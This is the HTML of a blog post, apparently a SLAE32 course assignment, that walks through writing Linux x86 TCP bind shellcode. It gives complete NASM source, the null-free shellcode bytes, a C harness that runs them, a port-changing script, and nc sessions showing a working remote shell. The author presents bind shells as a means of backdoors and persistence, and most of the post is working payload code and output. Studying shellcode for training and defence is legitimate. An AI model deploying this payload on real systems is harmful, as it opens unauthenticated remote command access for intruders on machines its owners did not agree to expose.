<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>SLAE32 Assignment 1 - TCP Bind Shellcode | nibbles</title>
<meta name="keywords" content="slae32">
<meta name="description" content="This post introduces the first mission to my SLAE32 journey.
Introduction The main goal for the first SLAE32 assignment is to develop a shellcode for bind TCP shell with the following requirements:
Binds to a port; Executing a shell on incoming connection; The shellcode should be null-free; With the ability for the port to be easily configurable. In other words, the connection port should be easy to set up for the user.">
<meta name="author" content="nibbles">
<link rel="canonical" href="https://0xnibbles.github.io/posts/slae_32_assignment_1/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.bccfefac377bc340f06c260aed1bddf49a4354816d7c570d6aac75a997986c95.css" integrity="sha256-vM/vrDd7w0DwbCYK7Rvd9JpDVIFtfFcNaqx1qZeYbJU=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
    onload="hljs.initHighlightingOnLoad();"></script>
<link rel="icon" href="https://0xnibbles.github.io/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://0xnibbles.github.io/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://0xnibbles.github.io/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://0xnibbles.github.io/apple-touch-icon.png">
<link rel="mask-icon" href="https://0xnibbles.github.io/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --hljs-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:title" content="SLAE32 Assignment 1 - TCP Bind Shellcode" />
<meta property="og:description" content="This post introduces the first mission to my SLAE32 journey.
Introduction The main goal for the first SLAE32 assignment is to develop a shellcode for bind TCP shell with the following requirements:
Binds to a port; Executing a shell on incoming connection; The shellcode should be null-free; With the ability for the port to be easily configurable. In other words, the connection port should be easy to set up for the user." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://0xnibbles.github.io/posts/slae_32_assignment_1/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-12-26T13:45:33+00:00" />
<meta property="article:modified_time" content="2022-12-26T13:45:33+00:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="SLAE32 Assignment 1 - TCP Bind Shellcode"/>
<meta name="twitter:description" content="This post introduces the first mission to my SLAE32 journey.
Introduction The main goal for the first SLAE32 assignment is to develop a shellcode for bind TCP shell with the following requirements:
Binds to a port; Executing a shell on incoming connection; The shellcode should be null-free; With the ability for the port to be easily configurable. In other words, the connection port should be easy to set up for the user."/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://0xnibbles.github.io/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "SLAE32 Assignment 1 - TCP Bind Shellcode",
      "item": "https://0xnibbles.github.io/posts/slae_32_assignment_1/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "SLAE32 Assignment 1 - TCP Bind Shellcode",
  "name": "SLAE32 Assignment 1 - TCP Bind Shellcode",
  "description": "This post introduces the first mission to my SLAE32 journey.\nIntroduction The main goal for the first SLAE32 assignment is to develop a shellcode for bind TCP shell with the following requirements:\nBinds to a port; Executing a shell on incoming connection; The shellcode should be null-free; With the ability for the port to be easily configurable. In other words, the connection port should be easy to set up for the user.",
  "keywords": [
    "slae32"
  ],
  "articleBody": " This post introduces the first mission to my SLAE32 journey.\nIntroduction The main goal for the first SLAE32 assignment is to develop a shellcode for bind TCP shell with the following requirements:\nBinds to a port; Executing a shell on incoming connection; The shellcode should be null-free; With the ability for the port to be easily configurable. In other words, the connection port should be easy to set up for the user. Bind TCP shell? What is this? Generally, a bind TCP shell or bind shell is created when a listening port is configured to redirect the input, output, and errors of an executable (mostly /bin/sh or /bin/bash) to an incoming connection.\nIn practical terms, any machine connecting to this port will be presented with a shell prompt on the target computer and can interact with it.\nA TCP bind shell is a common technique to create backdoors and persistence in a target machine.\nBasics First Before putting our hands-on on developing the shellcode, we should be familiar with the fundamental principles of how to create a proper bind shell. This way, we will better understand how the internals work and where to debug if an error occurs.\nMy approach was to analyze TCP bind shell implementation in a higher-level language, such as C.\nC Prototype Beforehand, analyzing the following code gives an idea of the structure and what syscalls need to be used.\n// from https://infosecwriteups.com/expdev-bind-tcp-shellcode-cebb5657a997 #include #include #include #include #include int main() { int sockfd, acceptfd; int port = 9001; // Server Address struct struct sockaddr_in addr; addr.sin_family = AF_INET; addr.sin_port = htons(port); addr.sin_addr.s_addr = INADDR_ANY; // 1) Socket Creation (sys_socket 1) sockfd = socket(AF_INET, SOCK_STREAM, 0); // 2) Bind() Syscall (sys_bind 2) bind(sockfd, (struct sockaddr *) \u0026addr, sizeof(addr)); // 3) Listen() Syscall (sys_listen 4) listen(sockfd, 0); // 4) Accept() Syscall (sys_accept 5) acceptfd = accept(sockfd, NULL, NULL); // 5) Dup2() Syscall dup2(acceptfd, 0); // stdin dup2(acceptfd, 1); // stdout dup2(acceptfd, 2); // stderr // 6) Execve() Syscall execve(\"/bin/sh\", NULL, NULL); return 0; } Testing the code to see how it behaves.\nCompiling with gcc\n$ gcc bind.c -o bind\nExecuting bind and using nc to perform a connection to port 9001 in localhost\nThe C bind shell works as expected. From this we have a reference to build our shellcode.\nChecking which syscalls are used In total there are 6 syscalls enumerated below:\nsocket - 359 - 0x167 bind - 361 - 0x169 listen - 363 - 0x16b accept4 - 364 - 0x16c dup2 - 63 - 0x3f execve - 11 - 0xb We can use the file /usr/include/x86_64-linux-gnu/asm/unistd_32 to check the definiton of each syscall.\nLet’s dive into each syscall and analyse why they are used and how we can define them in intel x86 ISA.\n1 - Socket syscall (0x167) // 1) Socket Creation sockfd = socket(AF_INET, SOCK_STREAM, 0); The socket syscall has 3 parameters\ndomain - The domain argument specifies a communication domain; this selects the protocol family which will be used for communication.\nIn this case, we are interested in the AF_INET flag which purpose is for IPv4 communication.\nSearching on the internet for where Socket is defined in the Linux environment, I found this Stackoverflow question.\nAfter checking each one, the file /usr/include/x86_64-linux-gnu/bits/socket.h has the value we are looking for\nWe can use the find command this purpose too.\nThe domain value (PF_INET) = 2\nType - specifies the communication semantics\nThe type is SOCK_STREAM = 1\nprotocol - The protocol specifies a particular protocol to be used with the socket.\nAccording to the man page page “Normally only a single protocol exists to support a particular socket type within a given protocol family, in which case protocol can be specified as 0”\nSo, protocol = 0\nTranslating to assembly:\neax = 0x167 ebx = 0x2 ecx = 0x1 edx = 0 2 - Bind Syscall (0x169) For this syscall the C code has the following structure:\nStruct sockaddr_in // Server Address struct struct sockaddr_in addr; addr.sin_family = AF_INET; addr.sin_port = htons(port); addr.sin_addr.s_addr = INADDR_ANY; Bind Syscall int sockfd, acceptfd; int port = 9001; // Server Address struct struct sockaddr_in addr; addr.sin_family = AF_INET; addr.sin_port = htons(port); addr.sin_addr.s_addr = INADDR_ANY; sockfd = socket(AF_INET, SOCK_STREAM, 0); // 2) Bind() Syscall bind(sockfd, (struct sockaddr *) \u0026addr, sizeof(addr)); With the following arguments:\nint sockfd - sockfd is the socket descriptor returned by socket() in eax. const struct sockaddr *addr - pointer to struct sockaddr that contains information about your IP address and por socklen_t addrlen - addrlen specifies the size, in bytes, of the address structure pointed to by addr. In other words, addrlen is set to sizeof(struct sockaddr). int sockfd\nFirst things first, as we have the socket fil descriptor in eax we can put it directly in ebx, the first argument. –\u003e mov ebx, eax\nconst struct sockaddr *addr\nAt first sight, defining the sockaddr struct appears to be complex but after some research on how to do it properly turns out to be really simple. We can define the struct using what I call the “Struct Stack Technique”. An adaption of the execve shellcode stack technique or jmp-call-pop technique.\nWe need to pass a pointer to the address of the struct. Using this technique, ESP will be used to pass the address to ecx.\nLet’s start creating our sockaddr to the stack. According to sockets programming tutorial and the C code shown above this struct is defined by the following parameters:\nIn pratical terms:\nAF_INET - 0x2 Port Number - 9001 (0x2329) Internet Address - 0.0.0.0 (all IPv4 address in the local machine) -\u003e meaning we can establish a connection from any interface. Very good for persistence purposes 0 sockeln_t addrlen\nThe value can be obtained from /usr/include/linux/in.h file (#define \\__SOCK_SIZE__ 16).\nTo be more specific the bind syscamll manual page as hints about the size. We know that is the size of the sockaddr struct. The man page as a specification on how this struct is organized.\nFrom there, sa_data is defined as a char array of 14 used to define the protocol address. A char is 1 byte in size, so the array has 14 bytes.\nBut what is sa_family_t type?\nLooking to sockets programming tutorial (page 3), says it is an unsigned short and it refers to the AF_XXX address family. An unsigned short is equal to 2 bytes.\nSearching where this type is defined in the filesystem it appeared this stackoverflow page pointing to this doc related to the sys/socket.h.\nSearching in the filesystem, we confirm sa_family_t is defined as unsigned short type. The doc also specifies it as unsigned int (2 bytes). See the C data types page.\nDoing the math, 2 bytes + 14 bytes = 16 bytes. That’s the confirmation for the sockaddr struct size.\n3 - Listen syscall (0x16b) It only requires 2 parameters. The socket field descriptor that we created before and backlog which is the number of connections allowed on the incoming queue. As we want our connection to be immediatily we put the value 0.\n// 3) Listen() Syscall listen(sockfd, 0); 4 - Accept4 syscall (0x16b) Simple syscall with four parameters. Returns a nonnegative integer that is a file descriptor for the accepted socket to eax register.\nThe man page states that addr can be NULL. For consequence addrlen must be NULL too. Also referes If flags is 0, then accept4() is the same as accept().\nJust need to null esi as according to the calling conventions –\u003e xor esi, esi\nWe already have sockfd and the rest are null. Pretty easy to setup.\n// 4) Accept() Syscall acceptfd = accept(sockfd, NULL, NULL); // 5) Dup2() Syscall 5 - Dup2 syscall (0x3f) Anyone familiar with OS stuff knows the use of the dup family syscalls.\nThis just duplicates stdinput, stdout and stderror to the created TCP connection file descriptor. Doing this it redirects input and output the established connection.\n// 5) Dup2() Syscall dup2(acceptfd, 0); // stdin dup2(acceptfd, 1); // stdout dup2(acceptfd, 2); // stderr 6 - Execve syscall (0xb) At this moment, everything is set up and we just need to tell the program to execute /bin/sh. The execve takes 3 arguments but in this case we just need to fill the first argument to achieve our purposes.\n// 6) Execve() Syscall execve(\"/bin/sh\", NULL, NULL); “Assembling” our shellcode Translating the above concepts to assembly follows the same steps. We just need to be careful to prepare and clean the registers according to each syscall, especially eax.\nAs eax is used to store the return data from a syscall, its content is always written and sometimes we need save eax’s content before calling a syscall.\nxor eax, eax ; zeroes eax cdq ; zeroes edx (trick to use less space) After this it’s time to set up the syscall arguments havinmg the C code as a reference.\n; socket syscall mov ax, 0x167 ; syscall socket() - 359 push byte 0x02 ; push and pop byte to save space (another trick) pop ebx ; PF_INET value from /usr/include/i386-linux-gnu/bits/socket.h push byte 0x01 pop ecx ; setting up SOCK_STREAM = 1 ; edx is already zero int 0x80\t; interruption syscall or interrupt vector. Returns pointer to the socket in eax EAX contains 0x167 which is sys_socket as seen in /usr/include/i386-linux-gnu/asm/unistd_32.h, then EBX is set to 0x2 (PF_INET).\nNext the value 0x01 is moved into ECX which is the value of SOCK_STREAM. EDX is already zero because of the previous cdq instruction.\nJust left to use the interruption syscall int 0x80 to create the socket.\nIf executed successfully, we have our socket. The next step is to setting up the bind syscall.\nBeforehand, let’s prepare the next syscall\nmov ebx, eax ; moves socket address to ebx (first arg of bind syscall - sockfd) xor eax, eax Then , the sockaddr_in struct is created as follows:\npush edx\t; edx remains zero ;sockaddr struct\tpush edx\t; edx is still zero -\u003e 0.0.0.0 - bind shell listens in all interfaces push word 0x2923 ; little endian -\u003e 9001 = 0x2329 push word 0x2 ; AF_INET mov ecx, esp ; Putting the struct pointer in ECX The struct is finally defined. The most trickiest part to understand I must say.\nEDX is still zero so pushing zeroes will effectively result into pushing the IP address 0.0.0.0. This address makes the program to lsien in all interfaces. A clever way if our purpose is to have persistence in a target machine.\nThe next step is to load to the stack the port number. As intel works with little-edian format we push 0x2923 which is the value 9001. Lastly, pushing 0x2 refers to AF_INET.\nNow, it is just a matter of putting 0x10 (16 bytes) to EDX which represents the size of sockaddr_in struct as mentioned in the previous section and execute the bind syscall with 0x169 in EAX.\nmov dl, 0x10 mov ax, 0x169 int 0x80 The follwoing syscalls are listen and accept4 which work similarly as the above functions.\nFor the accept4 we already have sockfd in EBX and we just need to clear the other arguments.\nFor dup2 we use a loop to use less instructions to save space while constructing a fully interactive bind shell.\n; accept4 syscall ; ebx already has sockfd xor eax, eax cdq xor ecx, ecx xor esi, esi mov ax, 0x16c int 0x80 ;xor edi, edi mov edx, eax ; edx is already zero ; dup2 syscall mov cl, 0x03 dup2: ;xor eax, eax ;mov al, 0x3f push byte 0x3f pop eax mov ebx, edx dec cl int 0x80 jnz dup2\t; decrements ecx and jumps until ecx=0 We reach the final stage, using execve syscall to execute /bin/sh and spawn a shell when a connection is made to the bind port. If all works as expected a system shell will be provided to the incoming connection which can interact with the target machine.\n; execve cdq\t; edx needs to be zero push ecx\t; ecx is zero because jnz and we avoid null bytes push 0x68732f2f ; /bin//ls push 0x6e69622f mov ebx, esp push byte 0xb ; execve syscall pop eax int 0x80 There is an important step in the above code that we must be aware of, how we place the string /bin/sh in the stack.\npush ecx\t; ecx is zero because jnz and we avoid null bytes push 0x68732f2f ; \"sl//\" push 0x6e69622f ; \"nib/\" mov ebx, esp The stack grows from high to low addresses, so we need to place /bin/sh and null terminated in reverse order. Besides that, one of the most important details we know is memory alignment. This highly influences the cpu performance and because of this it will attempt to maximmize the use of memory as efficient as possible.\nThe way it does in a 32-bit ISA is to work with multiples of 4 bytes in the memory address space. So, we need to make our string divisable by 4.\nBut /bin/sh is a 7 byte string, how we make it divisable by 4?\nThere are various ways, but what we can do is “abuse” the slashes. Using / or // is the same in the Linux environment. Using this knowledge we can use the string /bin//sh to fulfill memory aligment requirements.\nAs an extra challenge I leverage this task to develop a script called the The x86 \"Little-Hexdian\" String Convert which checks if a string passed as an argument is aligned and converts it to hexadecimal in little-endian format.\nHere’s a screenshot of the script output.\nAvailable in https://github.com/0xnibbles/slae_x86/blob/main/revHex32.py\nFinal Assembly Code ; Student ID : PA-31319 ; Student Name : Eduardo Silva ; Assignment 1 : TCP Bind Shell (Linux/x86) Assembly ; File Name : bind_shell.nasm global\t_start section\t.text _start: xor eax, eax cdq ; socket syscall mov ax, 0x167 ;xor ebx, ebx ;mov bl, 0x02 push byte 0x02 pop ebx ;xor ecx, ecx ;mov cl, 0x01 push byte 0x01 pop ecx ; edx is already zero int 0x80\t; interruption syscall or interrupt vector. Returns pointer to the socket in eax ; bind syscall mov ebx, eax ; moves socket address to ebx (first arg - sockfd) xor eax, eax push edx\t; edx remains zero ; sockaddr struct\tpush edx\t; 0.0.0.0 push word 0x2923 ;little endian -\u003e 9001 = 0x2329 push word 0x2 mov ecx, esp mov dl, 0x10 mov ax, 0x169 int 0x80 ; listen syscall xor eax, eax xor ecx, ecx ; ebx already has sockfd mov ax, 0x16b ;add ax, 0x2 int 0x80 ; accept4 syscall ; ebx already has sockfd xor eax, eax cdq xor ecx, ecx xor esi, esi mov ax, 0x16c int 0x80 ;xor edi, edi mov edx, eax ; edx is already zero ; dup2 mov cl, 0x03 dup2: push byte 0x3f pop eax mov ebx, edx dec cl int 0x80 jnz dup2\t; decrements ecx and jumps until ecx=0 ; execve cdq\t; edx needs to be zero ;push eax push ecx\t; ecx is zero because jnz push 0x68732f2f push 0x6e69622f mov ebx, esp ;xor eax, eax ;mov al, 0xb push byte 0xb pop eax int 0x80\tCompiling and Testing the Shellcode To be easier to compile my shellcode scripts and get the size and the opcodes, I developed a shell script named assembler.sh\nAvailable in https://github.com/0xnibbles/slae_x86/blob/main/assembler.sh\nChecking assembler.sh output\n╭─edu@debian ~/Desktop/slae_x86/assignments/1-Shell_Bind_TCP ‹main› ╰─$ ls bind bind.c bind_shell bind_shell.asm bind_shell.nasm bind_shell.o biShell.sh original_bind_shell.nasm syscalls ╭─edu@debian ~/Desktop/slae_x86/assignments/1-Shell_Bind_TCP ‹main› ╰─$ ../../assembler.sh bind_shell.nasm [*] Compiling with NASM [*] Linking [*] Extracting opcodes [*] Done Shellcode size: 95 \"\\x31\\xc0\\x99\\x66\\xb8\\x67\\x01\\x6a\\x02\\x5b\\x6a\\x01\\x59\\xcd\\x80\\x89\\xc3\\x31\\xc0\\x52\\x52\\x66\\x68\\x23\\x29\\x66\\x6a\\x02\\x89\\xe1\\xb2\\x10\\x66\\xb8\\x69\\x01\\xcd\\x80\\x31\\xc0\\x31\\xc9\\x66\\xb8\\x6b\\x01\\xcd\\x80\\x31\\xc0\\x99\\x31\\xc9\\x31\\xf6\\x66\\xb8\\x6c\\x01\\xcd\\x80\\x89\\xc2\\xb1\\x03\\x6a\\x3f\\x58\\x89\\xd3\\xfe\\xc9\\xcd\\x80\\x75\\xf5\\x99\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x6a\\x0b\\x58\\xcd\\x80\" -------------------- [*] Hack the World! -------------------- No null bytes appear in the shellcode. We are good to go and paste the shellcode to our shellcode.c program\n#include #include unsigned char code[] = \\ \"\\x31\\xc0\\x99\\x66\\xb8\\x67\\x01\\x6a\\x02\\x5b\\x6a\\x01\\x59\\xcd\\x80\\x89\\xc3\\x31\\xc0\\x52\\x52\\x66\\x68\\x23\\x29\\x66\\x6a\\x02\\x89\\xe1\\xb2\\x10\\x66\\xb8\\x69\\x01\\xcd\\x80\\x31\\xc0\\x31\\xc9\\x66\\xb8\\x6b\\x01\\xcd\\x80\\x31\\xc0\\x99\\x31\\xc9\\x31\\xf6\\x66\\xb8\\x6c\\x01\\xcd\\x80\\x89\\xc2\\xb1\\x03\\x6a\\x3f\\x58\\x89\\xd3\\xfe\\xc9\\xcd\\x80\\x75\\xf5\\x99\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x6a\\x0b\\x58\\xcd\\x80\"; main() { printf(\"Shellcode Length: %d\\n\", strlen(code)); int (*ret)() = (int(*)())code; ret(); } Compiling with gcc and executing it\n$ gcc -fno-stack-protector -m32 -z execstack -o shellcode shellcode.c shellcode.c:7:1: warning: return type defaults to ‘int’ [-Wimplicit-int] main() { ^~~~ ╭─edu@debian ~/Desktop/slae_x86/assignments/1-Shell_Bind_TCP ‹main●› ╰─$ ./bind_shell Shellcode Length: 95 No errors and our bind shell is awaiting for a connection. Let’s use nc to perform that.\n╭─edu@debian ~/Documents/blogGithub/dev-blog/0xnibbles ‹master●› ╰─$ nc -nv 127.0.0.1 9001 (UNKNOWN) [127.0.0.1] 9001 (?) open ls biShell.sh bind bind.c bind_shell bind_shell.asm bind_shell.nasm bind_shell.o original_bind_shell.nasm shellcode.c syscalls id uid=1000(edu) gid=1000(edu) groups=1000(edu),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),115(lpadmin),116(scanner) Fantastic! The TCP Bind Shell works as expected and was successfully injected into a working program.\nWhat if we want to change the bind port? One of the requirements for this assigment, is the ability to change easily the bind port used in the shellcode. For that, we can change the bytes in shellcode related to the port and changed them for specific port we want the bind shell waits for a connection.\nThe following shell script named biShell.sh replaces the hardcoded 9001 with the port provided by the user as an argument. It automatically converts the port into hexadecimal little-endian format.\nAvailable at https://github.com/0xnibbles/slae_x86/blob/main/assignments/1-Shell_Bind_TCP/biShell.sh\nIt accepts one argument - the desired bind port.\n╭─edu@debian ~/Desktop/slae_x86/assignments/1-Shell_Bind_TCP ‹main●› ╰─$ ./biShell.sh 9999 [*] Doing magic with your port number [*] Done Enjoy this Bind TCP Shellcode with the port 9999 \"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x99\\x66\\xb8\\x67\\x01\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc3\\x31\\xc0\\x52\\x52\\x66\\x68\\x27\\x0F\\x66\\x6a\\x02\\x89\\xe1\\xb2\\x10\\x66\\xb8\\x69\\x01\\xcd\\x80\\x31\\xc0\\x31\\xc9\\x66\\xb8\\x6b\\x01\\xcd\\x80\\x31\\xc0\\x99\\x31\\xc9\\x31\\xf6\\x66\\xb8\\x6c\\x01\\xcd\\x80\\x31\\xff\\x89\\xc7\\xb1\\x03\\x31\\xc0\\xb0\\x3f\\x89\\xfb\\xfe\\xc9\\xcd\\x80\\x75\\xf4\\x31\\xc0\\x99\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80\" [*] Port converted in hex Little-Endian: 270F -------------------- [*] Hack the World! -------------------- Compiling using our shellcode tester and executing it\n╭─edu@debian ~/Desktop/slae_x86/assignments/1-Shell_Bind_TCP ‹main●› ╰─$ gcc -fno-stack-protector -m32 -z execstack -o bind_shell9999 shellcode.c shellcode.c:7:1: warning: return type defaults to ‘int’ [-Wimplicit-int] main() { ^~~~ ╭─edu@debian ~/Desktop/slae_x86/assignments/1-Shell_Bind_TCP ‹main●› ╰─$ ./bind_shell9999 Shellcode Length: 101 Trying to establish a connection to port 9999\n╭─edu@debian ~/Documents/blogGithub/dev-blog/0xnibbles ‹master●› ╰─$ nc -nv 127.0.0.1 9999 (UNKNOWN) [127.0.0.1] 9999 (?) open ls biShell.sh bind bind.c bind_shell bind_shell.asm bind_shell.nasm bind_shell.o bind_shell9999 original_bind_shell.nasm shellcode.c syscalls id uid=1000(edu) gid=1000(edu) groups=1000(edu),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),115(lpadmin),116(scanner) We get a shell!!!\nThis blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/\nStudent ID: PA-31319\nAll the source code files are available on GitHub at https://github.com/0xnibbles/slae_x86\n",
  "wordCount" : "2987",
  "inLanguage": "en",
  "datePublished": "2022-12-26T13:45:33Z",
  "dateModified": "2022-12-26T13:45:33Z",
  "author":{
    "@type": "Person",
    "name": "nibbles"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://0xnibbles.github.io/posts/slae_32_assignment_1/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "nibbles",
    "logo": {
      "@type": "ImageObject",
      "url": "https://0xnibbles.github.io/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://0xnibbles.github.io/" accesskey="h" title="nibbles (Alt + H)">nibbles</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://0xnibbles.github.io/" title="Home">
                    <span>Home</span>
                </a>
            </li>
            <li>
                <a href="https://0xnibbles.github.io/about.html" title="About">
                    <span>About</span>
                </a>
            </li>
            <li>
                <a href="https://0xnibbles.github.io/categories/" title="Categories">
                    <span>Categories</span>
                </a>
            </li>
            <li>
                <a href="https://0xnibbles.github.io/projects/" title="Projects">
                    <span>Projects</span>
                </a>
            </li>
            <li>
                <a href="https://0xnibbles.github.io/archives" title="Archive">
                    <span>Archive</span>
                </a>
            </li>
            <li>
                <a href="https://0xnibbles.github.io/tags/" title="Tags">
                    <span>Tags</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://0xnibbles.github.io/">Home</a>&nbsp;»&nbsp;<a href="https://0xnibbles.github.io/posts/">Posts</a></div>
    <h1 class="post-title">
      SLAE32 Assignment 1 - TCP Bind Shellcode
    </h1>
    <div class="post-meta"><span title='2022-12-26 13:45:33 +0000 UTC'>December 26, 2022</span>&nbsp;·&nbsp;15 min&nbsp;·&nbsp;nibbles

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#introduction" aria-label="Introduction">Introduction</a><ul>
                        
                <li>
                    <a href="#bind-tcp-shell-what-is-this" aria-label="Bind TCP shell? What is this?">Bind TCP shell? What is this?</a></li></ul>
                </li>
                <li>
                    <a href="#basics-first" aria-label="Basics First">Basics First</a><ul>
                        
                <li>
                    <a href="#c-prototype" aria-label="C Prototype">C Prototype</a><ul>
                        
                <li>
                    <a href="#checking-which-syscalls-are-used" aria-label="Checking which syscalls are used">Checking which syscalls are used</a><ul>
                        
                <li>
                    <a href="#1---socket-syscall-0x167" aria-label="1 - Socket syscall (0x167)">1 - Socket syscall (0x167)</a></li>
                <li>
                    <a href="#2---bind-syscall-0x169" aria-label="2 - Bind Syscall (0x169)">2 - Bind Syscall (0x169)</a></li>
                <li>
                    <a href="#3---listen-syscall-0x16b" aria-label="3 - Listen syscall (0x16b)">3 - Listen syscall (0x16b)</a></li>
                <li>
                    <a href="#4---accept4-syscall-0x16b" aria-label="4 - Accept4 syscall (0x16b)">4 - Accept4 syscall (0x16b)</a></li>
                <li>
                    <a href="#5---dup2-syscall-0x3f" aria-label="5 - Dup2 syscall (0x3f)">5 - Dup2 syscall (0x3f)</a></li>
                <li>
                    <a href="#6---execve-syscall-0xb" aria-label="6 - Execve syscall (0xb)">6 - Execve syscall (0xb)</a></li></ul>
                </li></ul>
                </li>
                <li>
                    <a href="#assembling-our-shellcode" aria-label="&amp;ldquo;Assembling&amp;rdquo; our shellcode">&ldquo;Assembling&rdquo; our shellcode</a></li>
                <li>
                    <a href="#final-assembly-code" aria-label="Final Assembly Code">Final Assembly Code</a></li>
                <li>
                    <a href="#compiling-and-testing-the-shellcode" aria-label="Compiling and Testing the Shellcode">Compiling and Testing the Shellcode</a><ul>
                        
                <li>
                    <a href="#what-if-we-want-to-change-the-bind-port" aria-label="What if we want to change the bind port?">What if we want to change the bind port?</a>
                </li>
            </ul>
            </li>
            </ul>
            </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><p><img loading="lazy" src="/slae32/slae32.png#center" alt="SLAE32"  title="SLAE32"  />
</p>
<p>This post introduces the first mission to my SLAE32 journey.</p>
<h2 id="introduction">Introduction<a hidden class="anchor" aria-hidden="true" href="#introduction">#</a></h2>
<p>The main goal for the first SLAE32 assignment is to develop a shellcode for bind TCP shell with the following requirements:</p>
<ul>
<li>Binds to a port;</li>
<li>Executing a shell on incoming connection;</li>
<li>The shellcode should be <strong>null-free</strong>;</li>
<li>With the ability for the <strong>port to be easily configurable</strong>. In other words, the connection port should be easy to set up for the user.</li>
</ul>
<h3 id="bind-tcp-shell-what-is-this">Bind TCP shell? What is this?<a hidden class="anchor" aria-hidden="true" href="#bind-tcp-shell-what-is-this">#</a></h3>
<p>Generally, a bind TCP shell or bind shell is created when a listening port is configured to redirect the input, output, and errors of an executable (mostly /bin/sh or /bin/bash) to an incoming connection.</p>
<p>In practical terms, any machine connecting to this port will be presented with a shell prompt on the target computer and can interact with it.</p>
<p><img loading="lazy" src="/slae32/1/bindshell.png#center" alt="Bind Shell"  title="Bind Shell"  />
</p>
<p>A TCP bind shell is a common technique to create backdoors and persistence in a target machine.</p>
<h2 id="basics-first">Basics First<a hidden class="anchor" aria-hidden="true" href="#basics-first">#</a></h2>
<p>Before putting our hands-on on developing the shellcode, we should be familiar with the fundamental principles of how to create a proper bind shell. This way, we will better understand how the <em>internals</em> work and where to debug if an error occurs.</p>
